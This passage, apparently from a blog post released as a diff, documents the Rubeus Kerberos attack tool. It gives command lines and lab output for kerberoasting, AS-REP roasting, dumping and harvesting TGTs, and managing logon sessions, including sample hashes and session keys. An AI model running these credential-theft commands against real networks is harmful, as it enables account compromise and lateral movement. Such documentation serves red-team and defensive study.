+<p><span style="font-weight: 400;">Reminder that a logon session can only have one TGT applied at a time! A workaround is to start a process of logon type 9 using the </span><b>createnetonly</b><span style="font-weight: 400;"> action, and apply ticket applied to the specific logon ID with the </span><b>/luid:X</b><span style="font-weight: 400;"> parameter.</span></p>
+<p><strong>Note that the /luid parameter requires elevation!</strong></p>
+<h2><b>purge</b></h2>
+<p><span style="font-weight: 400;">The </span><b>purge</b><span style="font-weight: 400;"> action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by </span><b>/luid:X</b><span style="font-weight: 400;">. This is the same functionality as Mimikatz&#8217;/Kekeo&#8217;s </span><b>kerberos::purge</b><span style="font-weight: 400;"> function or Cobalt Strike&#8217;s </span><b>kerberos_ticket_purge</b><span style="font-weight: 400;">.</span></p>
+</div>
+<div>
+<pre class="lang:default decode:true" title="purge.txt">C:\Temp\tickets&gt;Rubeus.exe purge
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+[*] Action: Purge Tickets
+[+] Tickets successfully purged!
+
+C:\Temp\tickets&gt;Rubeus.exe purge /luid:34008685
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+[*] Action: Purge Tickets
+[*] Target LUID: 0x206ee6d
+[+] Tickets successfully purged!</pre>
+<div>
+<p><b>Note that the /luid parameter requires elevation!</b></p>
+<h2><b>describe</b></h2>
+<p><span style="font-weight: 400;">Sometimes you want to know the details of a specific .kirbi Kerberos cred you have. </span><span style="font-weight: 400;">The </span><b>describe</b><span style="font-weight: 400;"> action takes a </span><b>/ticket:X</b><span style="font-weight: 400;"> value (TGT or service ticket), parses it, and describes the values of the ticket. Like other </span><b>/ticket:X</b><span style="font-weight: 400;"> parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.</span></p>
+</div>
+</div>
+<div>
+<pre class="lang:default decode:true" title="describe.txt">c:\Rubeus&gt;Rubeus.exe describe /ticket:doIFmjCC...(snip)...
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+[*] Action: Display Ticket
+
+  UserName              :  dfm.a
+  UserRealm             :  TESTLAB.LOCAL
+  ServiceName           :  krbtgt
+  ServiceRealm          :  TESTLAB.LOCAL
+  StartTime             :  9/17/2018 6:51:00 PM
+  EndTime               :  9/17/2018 11:51:00 PM
+  RenewTill             :  9/24/2018 4:22:59 PM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType               :  rc4_hmac
+  Base64(key)           :  2Bpbt6YnV5PFdY7YTo2hyQ==
+</pre>
+<h2>createnetonly</h2>
+<p><span style="font-weight: 400;">The </span><b>createnetonly </b><span style="font-weight: 400;">action will use the </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw"><span style="font-weight: 400;">CreateProcessWithLogonW()</span></a><span style="font-weight: 400;"> API to create a new hidden (unless </span><b>/show</b><span style="font-weight: 400;"> is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the </span><b>ptt /luid:X</b><span style="font-weight: 400;"> parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.</span></p>
+<pre class="lang:default decode:true" title="createnetonly.txt">C:\Rubeus&gt;Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe"
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+[*] Action: Create Process (/netonly)
+
+[*] Showing process : False
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 9060
+[+] LUID            : 6290874
+</pre>
+<h2>kerberoast</h2>
+<p><span style="font-weight: 400;">The </span><b>kerberoast</b><span style="font-weight: 400;"> action replaces the </span><a href="https://github.com/GhostPack/SharpRoast"><span style="font-weight: 400;">SharpRoast</span></a><span style="font-weight: 400;"> project&#8217;s functionality. Like SharpRoast, this action uses the </span><a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx"><span style="font-weight: 400;">KerberosRequestorSecurityToken.GetRequest Method()</span></a><span style="font-weight: 400;"> method that was contributed to PowerView by </span><a href="https://twitter.com/machosec"><span style="font-weight: 400;">@machosec</span></a><span style="font-weight: 400;"> in order to request the proper service ticket. Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures instead of using a </span><a href="https://github.com/GhostPack/SharpRoast/blob/6cdbeb0cf14fe60ae74fdc174a9e70081c2fa8c0/SharpRoast/Program.cs#L70"><span style="font-weight: 400;">janky regex</span></a><span style="font-weight: 400;">.</span></p>
+<p><span style="font-weight: 400;">With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The </span><b>/spn:X</b><span style="font-weight: 400;"> argument roasts just the specified SPN, the </span><b>/user:X</b><span style="font-weight: 400;"> argument roasts just the specified user, and the </span><b>/ou:X</b><span style="font-weight: 400;"> argument roasts just users in the specific OU. Also, if you want to use alternate domain credentials for kerberoasting, that can be specified with </span><b>/creduser:DOMAIN.FQDN\USER</b> <b>/credpassword:PASSWORD</b><span style="font-weight: 400;">.</span></p>
+</div>
+<pre class="lang:default decode:true" title="kerberoast.txt">c:\Rubeus&gt;Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: Kerberoasting
+
+[*] SamAccountName         : testuser2
+[*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
+[*] ServicePrincipalName   : service/host
+[*] Hash                   : $krb5tgs$5$*$testlab.local$service/host*$95160F02CA8EB...(snip)...</pre>
+<h2>asreproast</h2>
+<p><span style="font-weight: 400;">The </span><b>asreproast</b><span style="font-weight: 400;"> action replaces the </span><a href="https://github.com/HarmJ0y/ASREPRoast/"><span style="font-weight: 400;">ASREPRoast</span></a><span style="font-weight: 400;"> project which executed similar actions with the (larger sized) </span><a href="https://www.bouncycastle.org/"><span style="font-weight: 400;">BouncyCastle</span></a><span style="font-weight: 400;"> library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline, a la kerberoasting.</span></p>
+<div><span style="font-weight: 400;">The </span><b>/user:X</b><span style="font-weight: 400;"> parameter is required while the </span><b>/domain</b><span style="font-weight: 400;"> and </span><b>/dc</b><span style="font-weight: 400;"> arguments are optional. If </span><b>/domain</b><span style="font-weight: 400;"> and</span><b> /dc</b><span style="font-weight: 400;"> are not specified Rubeus will pull system defaults as other actions do. The </span><a href="https://github.com/HarmJ0y/ASREPRoast/"><span style="font-weight: 400;">ASREPRoast</span></a><span style="font-weight: 400;"> project has a JohnTheRipper compatible cracking module for this hash type.</span></div>
+<div>
+<pre class="lang:default decode:true" title="asreproast.txt">c:\Rubeus&gt;Rubeus.exe asreproast /user:dfm.a
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: AS-REP Roasting
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: 'testlab.local\dfm.a'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 163 bytes
+[*] Received 1537 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$dfm.a@testlab.local:F7310EA341128...(snip)...</pre>
+<h2>dump</h2>
+</div>
+<div><span style="font-weight: 400;">The </span><b>dump</b><span style="font-weight: 400;"> action will extract current TGTs and service tickets from memory, if in an elevated context. The resulting extracted tickets can be filtered by </span><b>/service</b><span style="font-weight: 400;"> (use </span><b>/service:krbtgt</b><span style="font-weight: 400;"> for TGTs) and/or logon ID (the </span><b>/luid:X</b><span style="font-weight: 400;"> parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the </span><b>ptt</b><span style="font-weight: 400;"> function, Mimikatz&#8217;s </span><b>kerberos::ptt</b><span style="font-weight: 400;"> functionality, or Cobalt Strike&#8217;s </span><b>kerberos_ticket_use</b><span style="font-weight: 400;">.</span></div>
+<div>
+<pre class="lang:default decode:true" title="dump.txt">c:\Temp\tickets&gt;Rubeus.exe dump /service:krbtgt /luid:366300
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+[*] Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target LUID     : 0x596f6
+[*] Target service  : krbtgt
+
+
+  UserName                 : harmj0y
+  Domain                   : TESTLAB
+  LogonId                  : 366326
+  UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
+  AuthenticationPackage    : Kerberos
+  LogonType                : Interactive
+  LogonTime                : 9/17/2018 9:05:26 AM
+  LogonServer              : PRIMARY
+  LogonServerDNSDomain     : TESTLAB.LOCAL
+  UserPrincipalName        : harmj0y@testlab.local
+
+    [*] Enumerated 1 ticket(s):
+
+    ServiceName              : krbtgt
+    TargetName               : krbtgt
+    ClientName               : harmj0y
+    DomainName               : TESTLAB.LOCAL
+    TargetDomainName         : TESTLAB.LOCAL
+    AltTargetDomainName      : TESTLAB.LOCAL
+    SessionKeyType           : aes256_cts_hmac_sha1
+    Base64SessionKey         : AdI7UObh5qHL0Ey+n28oQpLUhfmgbAkpvcWJXPC2qKY=
+    KeyExpirationTime        : 12/31/1600 4:00:00 PM
+    TicketFlags              : name_canonicalize, pre_authent, initial, renewable, forwardable
+    StartTime                : 9/17/2018 4:20:25 PM
+    EndTime                  : 9/17/2018 9:20:25 PM
+    RenewUntil               : 9/24/2018 2:05:26 AM
+    TimeSkew                 : 0
+    EncodedTicketSize        : 1338
+    Base64EncodedTicket      :
+
+      doIFNjCCBTKgAwIBBaEDAg...(snip)...
+
+
+[*] Enumerated 4 total tickets
+[*] Extracted  1 total tickets</pre>
+<p><b>Note that this action must be run from an elevated context in order to dump other users&#8217; Kerberos tickets!</b></p>
+</div>
+<h2>monitor</h2>
+<div>
+<p><span style="font-weight: 400;">The </span><b>monitor</b><span style="font-weight: 400;"> action will monitor the event log for 4624 logon events and extract any new TGT tickets for the new logon IDs (LUIDs). The </span><b>/interval</b><span style="font-weight: 400;"> parameter (in seconds, default of 60) specifies how often to check the event log. A </span><b>/filteruser:X</b><span style="font-weight: 400;"> can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled. ;)</span></p>
+<p><span style="font-weight: 400;">When the </span><b>/filteruser</b><span style="font-weight: 400;"> (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.</span></p>
+</div>
+<pre class="lang:default decode:true" title="monitor.txt">c:\Rubeus&gt;Rubeus.exe monitor /filteruser:dfm.a
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 60 seconds for 4624 logon events
+[*] Target user : dfm.a
+
+
+[+] 9/17/2018 7:59:02 PM - 4624 logon event for 'TESTLAB.LOCAL\dfm.a' from '192.168.52.100'
+[*] Target LUID     : 0x991972
+[*] Target service  : krbtgt
+
+  UserName                 : dfm.a
+  Domain                   : TESTLAB
+  LogonId                  : 10033522
+  UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
+  AuthenticationPackage    : Kerberos
+  LogonType                : Network
+  LogonTime                : 9/18/2018 2:59:02 AM
+  LogonServer              :
+  LogonServerDNSDomain     : TESTLAB.LOCAL
+  UserPrincipalName        :
+
+    ServiceName              : krbtgt
+    TargetName               :
+    ClientName               : dfm.a
+    DomainName               : TESTLAB.LOCAL
+    TargetDomainName         : TESTLAB.LOCAL
+    AltTargetDomainName      : TESTLAB.LOCAL
+    SessionKeyType           : aes256_cts_hmac_sha1
+    Base64SessionKey         : orxXJZ/r7zbDvo2JUyFfi+2ygcZpxH8e6phGUT5zDbc=
+    KeyExpirationTime        : 12/31/1600 4:00:00 PM
+    TicketFlags              : name_canonicalize, renewable, forwarded, forwardable
+    StartTime                : 9/17/2018 7:59:02 PM
+    EndTime                  : 9/18/2018 12:58:59 AM
+    RenewUntil               : 9/24/2018 7:58:59 PM
+    TimeSkew                 : 0
+    EncodedTicketSize        : 1470
+    Base64EncodedTicket      :
+
+      doIFujCCBbagAwIBBaE...(snip)...
+
+
+[*] Extracted  1 total tickets</pre>
+<p><b>Note that this action needs to be run from an elevated context!</b></p>
+<h2>harvest</h2>
+<p><span style="font-weight: 400;">The </span><b>harvest</b><span style="font-weight: 400;"> action takes monitor one step further. It monitors the event log for 4624 events every </span><b>/interval:MINUTES</b><span style="font-weight: 400;"> for new logons, extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. On the </span><b>/interval</b><span style="font-weight: 400;">, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit), and the current cache of &#8220;usable&#8221;/valid TGT KRB-CRED .kirbis are output as base64 blobs.</span></p>
+<p><span style="font-weight: 400;">This allows you to harvest usable TGTs from a system without opening a read handle to LSASS, though elevated rights are needed to extract the tickets.</span></p>
+<div>
+<pre class="lang:default decode:true" title="harvest.txt">c:\Rubeus&gt;Rubeus.exe harvest /interval:30
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v0.0.1a
+
+[*] Action: TGT Harvesting (w/ auto-renewal)
+
+[*] Monitoring every 30 minutes for 4624 logon events
+
+...(snip)...
+
+[*] Renewing TGT for dfm.a@TESTLAB.LOCAL
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1520 bytes
+[*] Received 1549 bytes
+
+[*] 9/17/2018 6:43:02 AM - Current usable TGTs:
+
+User                  :  dfm.a@TESTLAB.LOCAL
+StartTime             :  9/17/2018 6:43:02 AM
+EndTime               :  9/17/2018 11:43:02 AM
+RenewTill             :  9/24/2018 2:07:48 AM
+Flags                 :  name_canonicalize, renewable, forwarded, forwardable
+Base64EncodedTicket   :
+
+    doIFujCCBbagAw...(snip)...</pre>
+<p><b>Note that this action must be run from an elevated context!</b></p>
+<p><span style="font-weight: 400;">This pairs nicely with </span><a href="https://github.com/GhostPack/Seatbelt"><span style="font-weight: 400;">Seatbelt</span></a><span style="font-weight: 400;">&#8216;s</span><b> 4624Events</b><span style="font-weight: 400;"> function, which will parse the event log for 4624 account logon events within the last 7 days. If there is an account of interest that authenticates on a semi-regular basis with a logon type that would result in a harvestable Kerberos TGT, the </span><b>harvest</b><span style="font-weight: 400;"> function can help you grab this credential.</span></p>
+<h1><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;">Wrapup</span></h1>
+<p><span style="font-weight: 400;">A lot of blood, sweat, and (Kerberos-related) tears went into this project, and I&#8217;m excited to get it into the hands of other offensive professionals. Hopefully we can all start to embrace the awesome functionality that is Kekeo, even if it&#8217;s wrapped in another shell.</span></p>
+<p><span style="font-weight: 400;">Note that this code is beta- it&#8217;s been tested in a limited number of environments but I&#8217;m sure there are various bugs and issues. :)</span></p>
+</div>
